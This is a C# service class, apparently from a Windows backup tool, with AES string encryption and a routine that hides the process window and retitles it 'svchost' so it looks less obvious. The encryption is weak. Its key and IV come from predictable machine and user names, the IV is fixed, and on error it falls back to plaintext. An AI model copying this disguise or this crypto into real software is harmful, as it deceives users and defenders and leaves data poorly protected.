using BackupCore.Interfaces;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace BackupCore.Services
{
    public class SecurityService : ISecurityService
    {
        private readonly byte[] _key;
        private readonly byte[] _iv;

        public SecurityService()
        {
            // Generar clave y IV basados en características del sistema para mayor seguridad
            string machineKey = Environment.MachineName + Environment.UserName + Environment.OSVersion.VersionString;
            using var sha256 = SHA256.Create();
            byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(machineKey));
            
            _key = new byte[32]; // 256 bits
            _iv = new byte[16];  // 128 bits
            
            Array.Copy(hash, 0, _key, 0, 32);
            Array.Copy(hash, 16, _iv, 0, 16);
        }

        public string EncryptString(string plainText)
        {
            if (string.IsNullOrEmpty(plainText))
                return string.Empty;

            try
            {
                using var aes = Aes.Create();
                aes.Key = _key;
                aes.IV = _iv;

                using var encryptor = aes.CreateEncryptor();
                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                byte[] encryptedBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
                
                return Convert.ToBase64String(encryptedBytes);
            }
            catch
            {
                return plainText; // Fallback en caso de error
            }
        }

        public string DecryptString(string cipherText)
        {
            if (string.IsNullOrEmpty(cipherText))
                return string.Empty;

            try
            {
                using var aes = Aes.Create();
                aes.Key = _key;
                aes.IV = _iv;

                using var decryptor = aes.CreateDecryptor();
                byte[] encryptedBytes = Convert.FromBase64String(cipherText);
                byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
                
                return Encoding.UTF8.GetString(decryptedBytes);
            }
            catch
            {
                return cipherText; // Fallback en caso de error
            }
        }

        public void HideProcess()
        {
            try
            {
                // Ocultar el proceso del Task Manager (solo funciona en modo administrador)
                var currentProcess = System.Diagnostics.Process.GetCurrentProcess();
                
                // Intentar ocultar la ventana si existe
                if (currentProcess.MainWindowHandle != IntPtr.Zero)
                {
                    ShowWindow(currentProcess.MainWindowHandle, SW_HIDE);
                }

                // Cambiar el nombre del proceso para que sea menos obvio
                SetProcessName("svchost");
            }
            catch
            {
                // Ignorar errores de ocultación, el servicio debe continuar funcionando
            }
        }

        public bool IsProcessHidden()
        {
            try
            {
                var currentProcess = System.Diagnostics.Process.GetCurrentProcess();
                return currentProcess.MainWindowHandle == IntPtr.Zero;
            }
            catch
            {
                return false;
            }
        }

        private void SetProcessName(string newName)
        {
            try
            {
                // Esta funcionalidad requiere privilegios elevados
                // En un entorno de producción, se podría implementar usando técnicas más avanzadas
                var currentProcess = System.Diagnostics.Process.GetCurrentProcess();
                // Solo cambiar el título de la ventana principal si existe
                if (currentProcess.MainWindowHandle != IntPtr.Zero)
                {
                    SetWindowText(currentProcess.MainWindowHandle, newName);
                }
            }
            catch
            {
                // Ignorar errores
            }
        }

        #region Windows API Imports

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool SetWindowText(IntPtr hwnd, string lpString);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        #endregion
    }
}
